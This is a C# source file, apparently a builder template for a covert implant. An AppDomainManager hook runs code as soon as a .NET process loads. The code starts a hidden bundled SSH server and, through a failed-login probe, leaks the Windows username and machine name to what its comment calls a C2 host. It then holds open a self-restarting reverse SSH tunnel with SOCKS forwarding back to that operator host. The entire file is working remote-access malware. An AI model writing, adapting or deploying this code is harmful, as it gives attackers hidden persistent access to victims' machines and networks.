using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Threading;

public sealed class BoltDomain : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Boltout.Begin();
        return;
    }
}

public class Boltout
{
    public static int CheckPorts(string sshHost, int port)
    {
        var timeout = 3;
        int noPort = 1337;
        using (var client = new TcpClient())
        {
            try
            {
                client.ReceiveTimeout = timeout * 1000;
                client.SendTimeout = timeout * 1000;
                var asyncResult = client.BeginConnect(sshHost, port, null, null);
                var waitHandle = asyncResult.AsyncWaitHandle;
                try
                {
                    if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(timeout), false))
                    {
                        client.Close();
                    }
                    else
                    {
                        if (client.Connected)
                            return port;
                        return noPort;
                    }
                    client.EndConnect(asyncResult);
                }
                finally
                {
                    waitHandle.Close();
                }
            }
            catch { }
        }
        return noPort;
    }

    static string SanitizeUsername(string raw)
    {
        var sb = new System.Text.StringBuilder();
        foreach (char c in raw)
        {
            if (char.IsLetterOrDigit(c) || c == '-' || c == '_' || c == '.')
                sb.Append(c);
            else
                sb.Append('_');
        }
        string s = sb.ToString().Trim('.', '-', '_');
        return s.Length > 0 ? s.Substring(0, Math.Min(s.Length, 64)) : "unknown";
    }

    public static void Begin()
    {
        string sshHost = "REPLACE_SSH_HOST";
        List<int> ports = new List<int> { REPLACE_PORT_ARRAY };
        int selectedPort = -1;

        foreach (int p in ports)
        {
            if (CheckPorts(sshHost, p) != 1337)
            {
                selectedPort = p;
                break;
            }
        }

        if (selectedPort == -1) return;

        try
        {
            string userName = "REPLACE_USERNAME";
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;

            string boltd = Path.Combine(baseDirectory, "BoltFiles", "boltd.exe");
            string boltHostKey = Path.Combine(baseDirectory, "BoltFiles", "bolt_key");
            string boltConfig = Path.Combine(baseDirectory, "BoltFiles", "boltd-config");
            string boltAllow = Path.Combine(baseDirectory, "BoltFiles", "authorized_keys");

            Process boltdStart = new Process();
            boltdStart.StartInfo.FileName = boltd;
            boltdStart.StartInfo.Arguments = $"-h {boltHostKey} -f {boltConfig} -o AuthorizedKeysFile={boltAllow}";
            boltdStart.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            boltdStart.Start();

            Thread.Sleep(REPLACE_STARTUP_DELAY_MS);

            string boltCon = Path.Combine(baseDirectory, "BoltFiles", "boltcon.exe");
            string boltKey = Path.Combine(baseDirectory, "BoltFiles", "REPLACE_KEYFILE_NAME");

            // Identity probe: one failed auth logs Windows user+machine to C2 auth log
            string probeUser = SanitizeUsername(Environment.UserName + "." + Environment.MachineName);
            Process probe = new Process();
            probe.StartInfo.FileName = boltCon;
            probe.StartInfo.Arguments = $"-o StrictHostKeyChecking=no -o ConnectTimeout=5 -o loglevel=ERROR -p {selectedPort} -i {boltKey} {probeUser}@{sshHost} -N";
            probe.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            probe.Start();
            if (!probe.WaitForExit(8000)) probe.Kill();

            while (true)
            {
                Process boltConStart = new Process();
                boltConStart.StartInfo.FileName = boltCon;
                boltConStart.StartInfo.Arguments = $"-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o Compression=yes -o ForwardAgent=no -o TCPKeepAlive=yes -o ServerAliveCountMax=5 -o loglevel=ERROR -p {selectedPort} -i {boltKey} {userName}@{sshHost} -R REPLACE_SOCKS_PORT -R REPLACE_TUNNEL_PORT:127.0.0.1:REPLACE_TUNNEL_PORT -N";
                boltConStart.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                boltConStart.Start();
                boltConStart.WaitForExit();
                Thread.Sleep(REPLACE_RECONNECT_DELAY_MS);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}
